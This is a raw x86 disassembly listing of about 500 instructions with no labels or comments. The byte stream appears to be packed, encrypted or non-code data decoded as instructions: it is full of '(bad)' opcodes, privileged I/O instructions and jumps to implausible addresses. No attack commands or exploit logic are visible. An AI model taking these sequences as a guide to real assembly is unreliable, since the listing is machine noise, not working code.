  423906:	pop    ss
  423907:	cmc    
  423908:	fwait
  423909:	jb     0x423929
  42390b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42390c:	fwait
  42390d:	and    dh,BYTE PTR [ebx+0x13a5cf66]
  423913:	pop    ss
  423914:	push   esi
  423915:	dec    ebp
  423916:	dec    esi
  423917:	mov    edi,0xf61773ef
  42391c:	nop
  42391d:	xchg   ebp,eax
  42391e:	das    
  42391f:	cld    
  423920:	mov    edi,0x65812edf
  423925:	sbb    al,0x12
  423927:	sbb    al,0x30
  423929:	jbe    0x4238f1
  42392b:	cmp    DWORD PTR [eax-0x55],0x5113dff9
  423932:	aad    0xc0
  423934:	mov    ebp,0x7ab74223
  423939:	sub    bh,0xc2
  42393c:	adc    al,BYTE PTR [ecx+edi*1]
  42393f:	outs   dx,BYTE PTR ds:[esi]
  423940:	arpl   WORD PTR [ebp+0x64],cx
  423943:	cwde   
  423944:	imul   ebx,DWORD PTR [eax+eiz*4-0x78],0xde69c274
  42394c:	repnz dec esi
  42394e:	dec    ebx
  42394f:	sub    BYTE PTR [esi+0x6f9a6b8e],bh
  423955:	inc    ebx
  423956:	ror    DWORD PTR [edx+0x2aae4cb],0x9e
  42395d:	adc    al,0x75
  42395f:	leave  
  423960:	aaa    
  423961:	lahf   
  423962:	push   ecx
  423963:	fdivr  DWORD PTR [ebx+0x42]
  423966:	div    DWORD PTR [ebx-0x5c]
  423969:	hlt    
  42396a:	test   al,0xf0
  42396c:	pop    ds
  42396d:	jge    0x423976
  42396f:	xchg   edx,eax
  423970:	sub    eax,DWORD PTR [ebp-0x6b]
  423973:	jne    0x42390b
  423975:	test   BYTE PTR [esi+0x45],al
  423978:	add    DWORD PTR [eax+0x336e1cd4],edi
  42397e:	clc    
  42397f:	add    bh,BYTE PTR [ebx+eiz*2+0x657d7cdd]
  423986:	jp     0x42393f
  423988:	pop    ss
  423989:	les    esi,FWORD PTR ds:0x5e8c3b1f
  42398f:	or     DWORD PTR [ecx+0x6b0b6962],edi
  423995:	fld    TBYTE PTR [eax-0x3c9f71de]
  42399b:	cmp    BYTE PTR [edi],0xbb
  42399e:	xor    al,0xac
  4239a0:	into   
  4239a1:	or     BYTE PTR [edx+0x8ecdb3c],bh
  4239a7:	mov    edx,0xd54f4f42
  4239ac:	mov    eax,0x953a03c1
  4239b1:	lahf   
  4239b2:	outs   dx,BYTE PTR ds:[esi]
  4239b3:	mov    al,ds:0x333b4467
  4239b8:	xlat   BYTE PTR ds:[ebx]
  4239b9:	popf   
  4239ba:	push   ecx
  4239bb:	and    eax,0x82524a73
  4239c0:	xchg   ecx,eax
  4239c1:	sub    DWORD PTR [ecx-0x55],edx
  4239c4:	adc    eax,DWORD PTR [eax+ecx*1+0x6d]
  4239c8:	cmp    eax,0xfad3abc8
  4239cd:	mov    edi,0xb110645e
  4239d2:	bound  ecx,QWORD PTR [esi-0x22f6cfa4]
  4239d8:	sbb    dh,bl
  4239da:	mov    bl,0x24
  4239dc:	cdq    
  4239dd:	mov    bh,cl
  4239df:	cmp    esp,DWORD PTR [esi+0xb]
  4239e2:	or     cl,BYTE PTR [esi]
  4239e4:	push   esi
  4239e5:	jecxz  0x423a29
  4239e7:	ja     0x4239ff
  4239e9:	lock push 0x6b
  4239ec:	jmp    0x42399a
  4239ee:	or     BYTE PTR [ebp+0x168ff080],ah
  4239f4:	dec    ebp
  4239f5:	fucomi st,st(0)
  4239f7:	cmp    al,0x7c
  4239f9:	outs   dx,BYTE PTR ds:[esi]
  4239fa:	jnp    0x423a20
  4239fc:	push   esi
  4239fd:	dec    ebx
  4239fe:	cmp    esi,DWORD PTR [edx]
  423a00:	imul   ecx,DWORD PTR [esi-0x242ee588],0x4c137c8
  423a0a:	sbb    BYTE PTR [esi+0x43e9f0eb],bh
  423a10:	(bad)  
  423a12:	mov    ecx,0x7ec336af
  423a17:	sbb    ah,BYTE PTR es:[ebp-0x5b]
  423a1b:	fsubr  DWORD PTR [edi+0x5a]
  423a1e:	mov    BYTE PTR [esi],ah
  423a20:	sub    dh,al
  423a22:	pushf  
  423a23:	mov    WORD PTR [edi],ds
  423a25:	inc    esi
  423a26:	fs (bad) 
  423a29:	xchg   edx,eax
  423a2a:	mov    al,0xac
  423a2c:	ins    BYTE PTR es:[edi],dx
  423a2d:	mov    al,0xd0
  423a2f:	cwde   
  423a30:	adc    DWORD PTR [ebp-0x6d],ebx
  423a33:	(bad)  
  423a34:	xor    eax,0x7855e894
  423a39:	pop    es
  423a3a:	aaa    
  423a3b:	dec    esp
  423a3c:	daa    
  423a3d:	repnz mov dl,BYTE PTR [eax+0x4fb868b]
  423a44:	in     eax,dx
  423a45:	repnz pop ss
  423a47:	les    edx,FWORD PTR [edi+0x7e731c0d]
  423a4d:	xchg   esi,eax
  423a4e:	cdq    
  423a4f:	(bad)  
  423a50:	xor    edx,DWORD PTR [ecx-0x20]
  423a53:	add    BYTE PTR [ebp-0x5a39ec66],al
  423a59:	leave  
  423a5a:	add    al,0x15
  423a5c:	or     eax,ebp
  423a5e:	pop    ebp
  423a5f:	mov    dl,0x34
  423a61:	dec    eax
  423a62:	scas   eax,DWORD PTR es:[edi]
  423a63:	call   0x17192c31
  423a68:	mov    ah,0x4a
  423a6a:	pop    es
  423a6b:	or     edx,edi
  423a6d:	push   0x47ff60c7
  423a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a73:	stos   BYTE PTR es:[edi],al
  423a74:	shl    BYTE PTR [ecx-0x7f],cl
  423a77:	push   es
  423a78:	cld    
  423a79:	jne    0x423a62
  423a7b:	nop
  423a7c:	addr16 mov bh,0x65
  423a7f:	or     DWORD PTR [edx+0x34],esi
  423a82:	mov    ch,BYTE PTR ds:0x56e750df
  423a88:	std    
  423a89:	loop   0x423a4b
  423a8b:	mov    bh,0x2e
  423a8d:	mov    BYTE PTR [edi-0x55bbb984],bl
  423a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a94:	not    DWORD PTR [eax]
  423a96:	jl     0x423a8a
  423a98:	xchg   esp,eax
  423a99:	pop    edi
  423a9a:	adc    DWORD PTR [ecx-0x5a6b2b2e],0x177a1a41
  423aa4:	dec    ebx
  423aa5:	jg     0x423aa7
  423aa7:	pop    ebx
  423aa8:	jmp    0xfb5837ca
  423aad:	test   BYTE PTR [edx-0x80],bl
  423ab0:	push   0x1113f1f9
  423ab5:	adc    eax,0xcaab87fc
  423aba:	mov    esp,0x7a882aa
  423abf:	fisttp DWORD PTR [esi+0x28]
  423ac2:	test   BYTE PTR [eax+ebp*2-0x6993e5b],bh
  423ac9:	jne    0x423a6b
  423acb:	(bad)  
  423acc:	rol    BYTE PTR [ebx-0x25],1
  423acf:	(bad)  
  423ad1:	inc    edi
  423ad2:	mov    al,0x77
  423ad4:	lds    ecx,FWORD PTR [ebp-0x545bb8c0]
  423ada:	(bad)  
  423adb:	pop    esi
  423adc:	adc    al,0x5e
  423ade:	addr16 jle 0x423b40
  423ae1:	in     al,dx
  423ae2:	iret   
  423ae3:	mov    esi,DWORD PTR [edi]
  423ae5:	fsubr  st(4),st
  423ae7:	test   ah,ch
  423ae9:	loop   0x423b3a
  423aeb:	out    0xa,al
  423aed:	call   0x658a4118
  423af2:	std    
  423af3:	shl    edi,0xb6
  423af6:	xor    BYTE PTR [eax-0x7b9e722d],al
  423afc:	push   edx
  423afd:	or     esp,ecx
  423aff:	add    ebp,eax
  423b01:	into   
  423b02:	mov    ss,WORD PTR [ebx+edi*2-0x74131abe]
  423b09:	push   ss
  423b0a:	adc    ch,bh
  423b0c:	(bad)  
  423b0e:	lock test al,0xfa
  423b11:	lea    ebp,[esi+0xc98be79]
  423b17:	jne    0x423ae0
  423b19:	je     0x423b39
  423b1b:	mov    ecx,0x72f0bb1
  423b20:	clc    
  423b21:	dec    ecx
  423b22:	test   al,0x66
  423b24:	out    0x2b,eax
  423b26:	cmp    ebx,ecx
  423b28:	xchg   esp,eax
  423b29:	adc    DWORD PTR [ecx],ebx
  423b2b:	inc    esp
  423b2c:	jae    0x423b86
  423b2e:	out    0x7a,al
  423b30:	sbb    DWORD PTR [esi+0x5c],ecx
  423b33:	pop    ebx
  423b34:	je     0x423b0e
  423b36:	cmp    esi,DWORD PTR ds:0x8646d23b
  423b3c:	add    eax,0xb91b07e1
  423b41:	xor    ebx,DWORD PTR [ecx]
  423b43:	lahf   
  423b44:	pop    esp
  423b45:	dec    esi
  423b46:	stos   DWORD PTR es:[edi],eax
  423b47:	mov    BYTE PTR [ecx-0x6e],al
  423b4a:	sbb    cl,BYTE PTR [ebp-0x3493f898]
  423b50:	lds    ebp,FWORD PTR [edi-0x543e587d]
  423b56:	pop    es
  423b57:	sbb    al,0x6c
  423b59:	inc    eax
  423b5a:	push   ds
  423b5b:	(bad)  
  423b5c:	das    
  423b5d:	cmp    eax,0x24d91911
  423b62:	or     eax,0x8a101982
  423b67:	dec    ecx
  423b68:	cmp    al,0x21
  423b6a:	pop    es
  423b6b:	dec    eax
  423b6c:	dec    edx
  423b6d:	not    DWORD PTR [esp+ecx*8+0x6a923273]
  423b74:	jns    0x423b48
  423b76:	dec    ecx
  423b77:	inc    esi
  423b78:	jle    0x423b7b
  423b7a:	ds adc dh,dh
  423b7d:	or     DWORD PTR [esi],ecx
  423b7f:	cld    
  423b80:	add    eax,0x62de15c2
  423b85:	retf   
  423b86:	cmp    BYTE PTR [ebx-0x3d],dh
  423b89:	xchg   edi,eax
  423b8a:	dec    ebp
  423b8b:	or     eax,0xde217c2
  423b90:	call   DWORD PTR [ebp-0x8]
  423b93:	sbb    esi,eax
  423b95:	mov    ds:0x98cff0e3,al
  423b9a:	adc    BYTE PTR [ecx],dl
  423b9c:	xchg   esp,eax
  423b9d:	dec    ebp
  423b9e:	scas   eax,DWORD PTR es:[edi]
  423b9f:	mov    ecx,DWORD PTR [ecx+edi*8+0x21]
  423ba3:	pop    ss
  423ba4:	lods   eax,DWORD PTR ds:[esi]
  423ba5:	xor    ebx,DWORD PTR [esi+eiz*1-0x7b37c51d]
  423bac:	(bad)  
  423bad:	cmp    al,0x75
  423baf:	ds add ah,bh
  423bb2:	push   esi
  423bb3:	lahf   
  423bb4:	xchg   esp,eax
  423bb5:	and    dl,BYTE PTR [eax]
  423bb7:	xor    ecx,DWORD PTR [ebp+0x5be58099]
  423bbd:	pop    ebx
  423bbe:	add    eax,0xe337416b
  423bc3:	out    dx,al
  423bc4:	xchg   esi,eax
  423bc5:	push   ecx
  423bc6:	sar    ecx,1
  423bc8:	(bad)  
  423bc9:	mov    esi,0xc7df7252
  423bce:	loope  0x423b72
  423bd0:	repz fwait
  423bd2:	(bad)  
  423bd3:	fs adc al,0xb2
  423bd6:	scas   al,BYTE PTR es:[edi]
  423bd7:	xchg   ebx,eax
  423bd8:	out    dx,al
  423bd9:	push   ecx
  423bda:	cmc    
  423bdb:	mov    edi,0xf240f4ef
  423be0:	ror    DWORD PTR [ebx-0x174031f6],1
  423be6:	in     al,dx
  423be7:	cld    
  423be8:	stc    
  423be9:	xor    BYTE PTR [esi],al
  423beb:	lock jmp 0xe254fb8c
  423bf1:	xchg   ecx,eax
  423bf2:	inc    ebx
  423bf3:	mov    dl,0x40
  423bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bf6:	pop    eax
  423bf7:	sahf   
  423bf8:	sub    esi,DWORD PTR [esi+0x4d8544d2]
  423bfe:	mov    esp,0x4c934e5a
  423c03:	rcl    DWORD PTR cs:0xb9aeb03a,0x50
  423c0b:	(bad)  
  423c0c:	call   0x5e2891b9
  423c11:	(bad)  
  423c12:	mov    dl,0xf3
  423c14:	pop    edx
  423c15:	js     0x423c62
  423c17:	cmp    eax,0x254bcc33
  423c1c:	fidiv  DWORD PTR [edi]
  423c1e:	cli    
  423c1f:	(bad)  
  423c20:	adc    BYTE PTR [ebx-0x3a],al
  423c23:	adc    BYTE PTR [ebp+0x24],bh
  423c26:	pop    esi
  423c27:	sahf   
  423c28:	push   0xffffff97
  423c2a:	out    dx,eax
  423c2b:	cmp    eax,0xae68c5ac
  423c30:	cdq    
  423c31:	jg     0x423c60
  423c33:	xor    esi,DWORD PTR [edi-0x7c4ade5a]
  423c39:	lds    ebx,FWORD PTR [edx]
  423c3b:	mov    esi,0x96588a25
  423c40:	jo     0x423cba
  423c42:	into   
  423c43:	xchg   ecx,eax
  423c44:	pushf  
  423c45:	add    DWORD PTR [ecx+eax*2],ebx
  423c48:	call   DWORD PTR [edx-0x5f]
  423c4b:	das    
  423c4c:	dec    ebx
  423c4d:	sub    esp,DWORD PTR [ecx]
  423c4f:	pop    eax
  423c50:	int    0x4f
  423c52:	sub    DWORD PTR [eax-0x3853b1ae],ecx
  423c58:	cmc    
  423c59:	push   eax
  423c5a:	cmc    
  423c5b:	clc    
  423c5c:	scas   al,BYTE PTR es:[edi]
  423c5d:	mov    WORD PTR [ecx+edx*8],ds
  423c60:	dec    eax
  423c61:	jb     0x423caf
  423c63:	sub    al,BYTE PTR [edx-0x13]
  423c66:	es (bad) 
  423c68:	and    al,0x2e
  423c6a:	adc    al,0xc9
  423c6c:	jle    0x9467eac6
  423c72:	inc    esi
  423c73:	fld    TBYTE PTR [edx+ebx*1-0x36d7493d]
  423c7a:	pop    ecx
  423c7b:	jo     0x423cf3
  423c7d:	add    ah,BYTE PTR [edx+0x2d]
  423c80:	rol    BYTE PTR [ecx-0x3c0a23ce],cl
  423c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c87:	and    DWORD PTR [ebx+0x42],edx
  423c8a:	xchg   esi,eax
  423c8b:	jg     0x423c75
  423c8d:	mov    DWORD PTR [esi-0x22],eax
  423c90:	jmp    0x7bede7cf
  423c95:	fistp  WORD PTR [ebx]
  423c97:	call   DWORD PTR [esi-0x5a06629b]
  423c9d:	or     al,bh
  423c9f:	(bad)  
  423ca0:	and    eax,0x1606327
  423ca5:	lods   eax,DWORD PTR ds:[esi]
  423ca6:	push   0x157d00d9
  423cab:	mov    al,0x6d
  423cad:	dec    edx
  423cae:	mov    eax,ds:0xa17787d2
  423cb3:	mov    ebx,0x39942315
  423cb8:	enter  0x8ea4,0xc1
  423cbc:	sub    eax,0xe34b7973
  423cc1:	sbb    eax,0xd51e632f
  423cc6:	test   bh,bl
  423cc8:	popa   
  423cc9:	pop    ebx
  423cca:	push   esp
  423ccb:	adc    BYTE PTR [edx],al
  423ccd:	leave  
  423cce:	xlat   BYTE PTR ds:[ebx]
  423ccf:	es jmp 0x9e81:0xd4436d25
  423cd7:	in     al,0xcb
  423cd9:	push   ss
  423cda:	aaa    
  423cdb:	xor    dl,BYTE PTR [eax+0x4049cec]
  423ce1:	dec    DWORD PTR [eax+ebx*2+0x44aa6b45]
  423ce8:	leave  
  423ce9:	xor    BYTE PTR [ecx],bh
  423ceb:	xlat   BYTE PTR ds:[ebx]
  423cec:	into   
  423ced:	(bad)  
  423cee:	in     eax,0xd8
  423cf0:	es out dx,al
  423cf2:	out    dx,eax
  423cf3:	stos   DWORD PTR es:[edi],eax
  423cf4:	jg     0x423d37
  423cf6:	lea    eax,[edx]
  423cf8:	mov    dh,0xa1
  423cfa:	js     0x423c7e
  423cfc:	inc    esp
  423cfd:	aad    0x12
  423cff:	cdq    
  423d00:	and    eax,0xa226c6e2
  423d05:	std    
  423d06:	icebp  
  423d07:	not    ch
  423d09:	test   DWORD PTR [ebp+0x1b],0xc1da77a2
  423d10:	clc    
  423d11:	or     dh,BYTE PTR [esi+0xa77bf38]
  423d17:	je     0x423d42
  423d19:	mov    eax,ds:0x660f57de
  423d1e:	jp     0x423d7d
  423d20:	mov    edx,0x418eb3
  423d25:	add    BYTE PTR [eax],al
  423d27:	add    BYTE PTR [eax],al
  423d29:	add    BYTE PTR [edx+edx*2+0x57],al
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax+0x619afe6e],ah
  423d38:	test   DWORD PTR [esi+0x1cb68],ebx
  423d3e:	add    BYTE PTR [esi],0x0
  423d41:	add    al,dh
  423d43:	test   DWORD PTR ds:0x9134e37b,ecx
  423d49:	adc    dl,dh
  423d4b:	pop    es
  423d4c:	jo     0x423dbe
  423d4e:	popf   
  423d4f:	cli    
  423d50:	adc    al,0x9c
  423d52:	sub    DWORD PTR [ebx+ebp*1-0xe51dcff],ecx
  423d59:	mov    esi,0x709908fd
  423d5e:	out    dx,eax
  423d5f:	loop   0x423d49
  423d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d62:	push   es
  423d63:	or     DWORD PTR [edi],ebp
  423d65:	push   edx
  423d66:	add    DWORD PTR [edi-0xd221742],edx
  423d6c:	sbb    edx,DWORD PTR [esi+0x379db13b]
  423d72:	fldpi  
  423d74:	int3   
  423d75:	add    DWORD PTR [ebp+esi*4+0x4b],esp
  423d79:	aam    0xf6
  423d7b:	rcl    DWORD PTR [esi-0xcd30a3a],0x4e
  423d82:	mov    al,0xf3
  423d84:	hlt    
  423d85:	paddsb mm1,QWORD PTR [ecx+0x34b227d4]
  423d8c:	aaa    
  423d8d:	dec    ebx
  423d8e:	and    DWORD PTR [edi+ebx*8+0x7034bb69],esp
  423d95:	add    esi,eax
  423d97:	jnp    0x423d3b
  423d99:	mov    eax,ds:0x24d6067e
  423d9e:	ret    
  423d9f:	nop
  423da0:	mov    ebp,0x23546065
  423da5:	xor    cl,BYTE PTR [edx]
  423da7:	dec    esp
  423da8:	mov    BYTE PTR [esi+0x14],al
  423dab:	push   edi
  423dac:	jl     0x423e05
  423dae:	cmp    DWORD PTR [ebx],ebp
  423db0:	out    0x80,eax
  423db2:	out    0x8c,al
  423db4:	mov    esp,0x4ec801eb
  423db9:	cmp    esp,ebx
  423dbb:	test   DWORD PTR cs:[edx-0x5585555],ecx
  423dc2:	mov    edi,0xf19ce5d1
  423dc7:	dec    esp
  423dc8:	outs   dx,DWORD PTR ds:[esi]
  423dc9:	jbe    0x423d8f
  423dcb:	les    eax,FWORD PTR [edi+0x1f]
  423dce:	inc    eax
  423dcf:	cmp    eax,0x50bdb0fe
  423dd4:	sbb    ch,BYTE PTR [ebx+0x28]
  423dd7:	add    eax,0xaa52621f
  423ddc:	xchg   esp,eax
  423ddd:	push   es
  423dde:	cmp    eax,0xdd606b15
  423de3:	outs   dx,BYTE PTR ds:[esi]
  423de4:	bound  edx,QWORD PTR [edi+0x652a945]
  423dea:	pop    ss
  423deb:	or     DWORD PTR [ecx-0x3a],edx
  423dee:	test   esi,0x3ce2906a
  423df4:	push   es
  423df5:	cmp    dh,BYTE PTR [edi]
  423df7:	mov    eax,0x940f5cb0
  423dfc:	mov    eax,ds:0x11e1eb72
  423e01:	push   cs
  423e02:	ins    DWORD PTR es:[edi],dx
  423e03:	in     eax,dx
  423e04:	jmp    FWORD PTR [eax-0x57e17a07]
  423e0a:	cmc    
  423e0b:	(bad)  
  423e0c:	fidiv  DWORD PTR [ebp+0x1112e8ac]
  423e12:	pop    ss
  423e13:	test   al,0xd0
  423e15:	data16 cmp ch,BYTE PTR [edi+0x795a6285]
  423e1c:	addr16 pop ss
  423e1e:	imul   esi,DWORD PTR [ebx+0x12],0xd66adda6
  423e25:	mov    edx,0xce8f56aa
  423e2a:	out    dx,eax
  423e2b:	cmp    al,0x58
  423e2d:	imul   edx,DWORD PTR [esi+0x54b842f9],0x4b
  423e34:	mov    dl,BYTE PTR [ebp-0x21b888fc]
  423e3a:	push   ss
  423e3b:	pop    esi
  423e3c:	retf   
  423e3d:	inc    eax
  423e3e:	add    edi,DWORD PTR [ecx]
  423e40:	stos   DWORD PTR es:[edi],eax
  423e41:	push   ebx
  423e42:	scas   eax,DWORD PTR es:[edi]
  423e43:	inc    esi
  423e44:	pop    ebx
  423e45:	mov    ds:0x25dceaba,al
  423e4a:	jg     0x423e4b
  423e4c:	div    al
  423e4e:	pop    ss
  423e4f:	inc    edi
  423e50:	mov    al,0xb8
  423e52:	xor    ah,BYTE PTR [esi-0x23678e0a]
  423e58:	mov    ebp,0xd0b14c6c
  423e5d:	lock xchg ebp,eax
  423e5f:	jp     0x423e1d
  423e61:	fnstsw WORD PTR [eax+ecx*8-0x449ce019]
  423e68:	inc    esi
  423e69:	fbstp  TBYTE PTR [edx-0xc85053e]
  423e6f:	sbb    eax,0xc1dc9dcf
  423e74:	sub    al,0xcf
  423e76:	push   esi
  423e77:	inc    eax
  423e78:	cmc    
  423e79:	sbb    al,0x7e
  423e7b:	or     BYTE PTR [edi+0x4c],0x71
  423e7f:	push   edx
  423e80:	shl    BYTE PTR [edi+0x69],0xd7
  423e84:	xor    al,0x75
  423e86:	out    dx,eax
  423e87:	aas    
  423e88:	push   ds
  423e89:	mov    edi,0x9eadb66a
  423e8e:	mov    ch,0x68
  423e90:	jbe    0x423eee
  423e92:	mov    ah,0x49
  423e94:	or     DWORD PTR [ebx],eax
  423e96:	pop    ecx
  423e97:	jbe    0x423e22
  423e99:	sbb    ecx,DWORD PTR [eax+0x6dd57742]
  423e9f:	test   eax,edx
  423ea1:	fistp  DWORD PTR [ecx+0x11]
  423ea4:	fwait
  423ea5:	test   al,0x30
  423ea7:	or     BYTE PTR [edx-0x3c317636],dl
  423ead:	inc    esp
  423eae:	mov    esi,0xacda9aa1
  423eb3:	jle    0x423e83
  423eb5:	lods   al,BYTE PTR ds:[esi]
  423eb6:	sub    DWORD PTR [esi-0x79fe183d],ebp
  423ebc:	in     al,dx
  423ebd:	lods   eax,DWORD PTR ds:[esi]
  423ebe:	add    BYTE PTR [edi],al
  423ec0:	add    eax,DWORD PTR [eax]
  423ec2:	inc    esp
  423ec3:	test   DWORD PTR [esi+0x2245647c],ebx
  423ec9:	pop    edx
  423eca:	call   0x29a3:0xc52406e
  423ed1:	xor    eax,0x489d483d
  423ed6:	popa   
  423ed7:	xor    al,0xb0
  423ed9:	imul   edi,DWORD PTR [eax-0x40],0x67
  423edd:	sub    al,0x3e
  423edf:	ret    0xcc39
  423ee2:	arpl   dx,bx
  423ee4:	push   eax
  423ee5:	(bad)  
  423ee6:	xchg   esp,eax
  423ee7:	pop    ss
  423ee8:	(bad)  
  423ee9:	cli    
  423eea:	fisubr WORD PTR [esi+0x1b]
  423eed:	ins    BYTE PTR es:[edi],dx
  423eee:	push   ss
  423eef:	cwde   
  423ef0:	shr    BYTE PTR [esi-0x5d7b69ff],1
  423ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ef7:	fld    QWORD PTR [ebx+0x7e]
  423efa:	sub    al,0x73
  423efc:	scas   eax,DWORD PTR es:[edi]
  423efd:	pushf  
  423efe:	call   FWORD PTR [eax-0x3c761da3]
  423f04:	and    eax,0xb9caf4f2
  423f09:	rcr    ebp,cl
  423f0b:	out    dx,eax
  423f0c:	hlt    
  423f0d:	mov    DWORD PTR [ecx],ecx
  423f0f:	aad    0x4d
  423f11:	jnp    0x423ead
  423f13:	and    al,0x8a
  423f15:	xlat   BYTE PTR ds:[ebx]
  423f16:	(bad)  
  423f17:	test   al,0x38
  423f19:	imul   edx,DWORD PTR ds:0x7c8f77f2,0xf
  423f20:	sbb    DWORD PTR [edx],0x6f63625b
  423f26:	(bad)  
  423f27:	(bad)  
  423f28:	call   0x5122ac24
  423f2d:	push   0xe9fc4fe7
  423f32:	and    ebx,DWORD PTR [ecx+0x57607867]
  423f38:	inc    eax
  423f39:	test   eax,0x98ff64dc
  423f3e:	mov    al,BYTE PTR [edx-0x6b]
  423f41:	mov    eax,ds:0x38d16fc3
  423f46:	jnp    0x423ed9
  423f48:	fs scas al,BYTE PTR es:[edi]
  423f4a:	in     eax,dx
  423f4b:	jg     0x423fc9
  423f4d:	pop    esp
  423f4e:	mov    dl,0x63
  423f50:	xchg   BYTE PTR [edi-0x1bd85c5d],al
  423f56:	mov    cs,ecx
  423f58:	push   0x6c2e25
  423f5d:	adc    ebx,edi
  423f5f:	and    DWORD PTR [ecx+0x66],ebx
  423f62:	into   
  423f63:	jecxz  0x423f1d
  423f65:	gs mov ebp,0xf28a73aa
  423f6b:	mov    eax,0xd5a064d5
  423f70:	test   DWORD PTR [ecx-0x48778500],edi
  423f76:	mov    esi,esi
  423f78:	fnstsw WORD PTR [ecx-0x73]
  423f7b:	js     0x423f20
  423f7d:	es mov esi,0xe4062577
  423f83:	cmp    DWORD PTR [ebp-0x63325b1d],0x3e
  423f8a:	(bad)  
  423f8b:	mov    WORD PTR [ebx],es
  423f8d:	rcl    dl,1
  423f8f:	(bad)  
  423f90:	out    0x4f,al
  423f92:	jb     0x423fc8
  423f94:	shr    DWORD PTR [esi],0xae
  423f97:	jo     0x423faa
  423f99:	mov    edi,0xb6cd99c7
  423f9e:	std    
  423f9f:	jecxz  0x424005
  423fa1:	mov    dh,0x56
  423fa3:	mov    esp,fs
  423fa5:	xor    cl,BYTE PTR [eax]
  423fa7:	mov    edx,0xceb84d96
  423fac:	pop    esi
  423fad:	test   BYTE PTR [edi],0x36
  423fb0:	aaa    
  423fb1:	ror    BYTE PTR [eax],cl
  423fb3:	ja     0x423fa4
  423fb5:	cmp    ebx,0xffffff98
  423fb8:	push   eax
  423fb9:	mov    ebx,0x81c41337
  423fbe:	mov    eax,ds:0xe905b1ce
  423fc3:	shr    DWORD PTR [ebx-0x78],0x9e
  423fc7:	adc    esp,ebp
  423fc9:	pop    edx
  423fca:	cmp    BYTE PTR [ebx],ah
  423fcc:	pop    ebp
  423fcd:	(bad)  
  423fce:	xor    edx,DWORD PTR [ecx]
  423fd0:	dec    edi
  423fd1:	mov    eax,0x75afa86f
  423fd6:	inc    ecx
  423fd7:	mov    esi,esi
  423fd9:	mov    esp,0x42a2bae8
  423fde:	cmp    ecx,esp
  423fe0:	sbb    eax,0x19919a28
  423fe5:	jne    0x423ff4
  423fe7:	lods   eax,DWORD PTR ds:[esi]
  423fe8:	fiadd  WORD PTR [esi-0x2f]
  423feb:	adc    al,0xb6
  423fed:	mov    dl,0x86
  423fef:	pop    es
  423ff0:	test   BYTE PTR [ebx+0x603ecd88],0x1
  423ff7:	cmp    BYTE PTR [ebx-0x4bc44294],dl
  423ffd:	cmp    BYTE PTR [ecx],bh
  423fff:	ds inc edx
  424001:	push   es
  424002:	(bad)  
  424003:	jbe    0x424015
  424005:	clc    
  424006:	add    edi,DWORD PTR [edx-0x21]
  424009:	aad    0x87
  42400b:	sub    al,0xb
  42400d:	ss jg  0x424030
  424010:	xlat   BYTE PTR ds:[ebx]
  424011:	je     0x42402f
  424013:	xchg   edi,eax
  424014:	stos   DWORD PTR es:[edi],eax
  424015:	test   DWORD PTR [edi],0x8609d585
  42401b:	aad    0x9f
  42401d:	bound  ebp,QWORD PTR [eax+0x172faebc]
  424023:	add    eax,0x55dc808b
  424028:	js     0x423fdc
  42402a:	bound  ecx,QWORD PTR [ecx-0x9819941]
  424030:	mov    esi,0x26a303c2
  424035:	push   0x5d05a13e
  42403a:	xor    DWORD PTR [ebp-0x3411e5ac],esi
  424040:	das    
  424041:	addr16 aam 0xf6
  424044:	sbb    DWORD PTR [edx],0x816842a8
  42404a:	aas    
  42404b:	adc    al,BYTE PTR [edx-0x66]
  42404e:	jb     0x423fd1
  424050:	das    
  424051:	xor    DWORD PTR [ecx-0x576638a5],0xb3619a78
  42405b:	sub    al,0x5a
  42405d:	shl    BYTE PTR [ebp+0x34],cl
  424060:	les    ebx,FWORD PTR [eax+0x29a74cc9]
  424066:	test   DWORD PTR [ebp+ecx*4-0x32],0x8ad3f709
  42406e:	jge    0x424080
  424070:	push   ebp
  424071:	cli    
  424072:	dec    edi
  424073:	sbb    esp,ebx
  424075:	ss sub dh,ch
  424078:	in     eax,dx
  424079:	nop
  42407a:	nop
  42407b:	seto   BYTE PTR [ebx]
  42407e:	ins    BYTE PTR es:[edi],dx
  42407f:	mov    ch,ah
  424081:	das    
  424082:	test   BYTE PTR ds:0x4c4d6fe9,0x29
  424089:	sbb    al,0x83
  42408b:	adc    BYTE PTR [edi+0x6921d7c3],ch
  424091:	sub    al,0x75
  424093:	(bad)  
  424094:	dec    esi
  424095:	mov    dh,0x67
  424097:	fwait
  424098:	stos   BYTE PTR es:[edi],al
  424099:	and    cl,BYTE PTR [esi-0x6f]
  42409c:	mov    al,ds:0x9d237083
  4240a1:	sbb    eax,0xf4177d2b
  4240a7:	cdq    
  4240a8:	jns    0x424076
  4240aa:	pop    edx
  4240ab:	push   ebp
  4240ac:	leave  
  4240ad:	or     ah,BYTE PTR [ebx]
  4240af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240b0:	jge    0x424091
  4240b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240b3:	xchg   ecx,eax
  4240b4:	mov    ebp,0x56003bef
  4240b9:	es cli 
  4240bb:	(bad)  
  4240bc:	fistp  QWORD PTR [ebx+ebp*8+0x2cc0f552]
  4240c3:	aam    0x63
  4240c5:	xor    cl,BYTE PTR [ebx+0x7]
  4240c8:	adc    dl,BYTE PTR [ebp-0x60c1157f]
  4240ce:	add    ebp,DWORD PTR [esi-0x2269057]
  4240d4:	sub    DWORD PTR [edx-0x2d4979ba],ebx
  4240da:	dec    ebx
  4240db:	ja     0x424107
  4240dd:	fimul  WORD PTR [esi+edi*2+0x17]
  4240e1:	jbe    0x42411b
  4240e3:	or     dh,bl
  4240e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240e6:	inc    ebp
  4240e7:	in     eax,dx
  4240e8:	mov    ecx,0x57d32c71
  4240ed:	idiv   BYTE PTR [edx]
  4240ef:	stos   BYTE PTR es:[edi],al
  4240f0:	cmp    DWORD PTR [edx-0x52a32423],ecx
